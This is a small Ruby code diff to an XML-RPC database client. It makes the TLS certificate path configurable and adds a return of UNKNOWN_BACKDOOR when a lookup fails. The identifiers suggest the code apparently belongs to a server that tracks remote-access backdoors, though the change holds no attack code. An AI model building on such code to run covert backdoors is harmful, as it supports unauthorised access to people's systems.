@@ -29,10 +29,10 @@ class DB_xmlrpc
     #http.verify_mode = OpenSSL::SSL::VERIFY_NONE
 
     # CA certificate to check if the server ssl certificate is valid
-    http.ca_file = Dir.pwd + "/config/rcs-client.pem"
+    http.ca_file = Dir.pwd + "/config/" + Config.instance.global['DB_CERT']
 
     # our client certificate to send to the server
-    http.cert = OpenSSL::X509::Certificate.new(File.read(Dir.pwd + "/config/rcs-client.pem")) 
+    http.cert = OpenSSL::X509::Certificate.new(File.read(Dir.pwd + "/config/" + Config.instance.global['DB_CERT'])) 
 
     trace :debug, "Using XML-RPC to communicate with #{@host}:#{@port}"
   end
@@ -128,6 +128,8 @@ class DB_xmlrpc
       if e.respond_to?(:faultCode) and e.faultCode == 1702 then
         return DB::NO_SUCH_BACKDOOR, 0
       end
+
+      return DB::UNKNOWN_BACKDOOR, bid
     end
   end
 
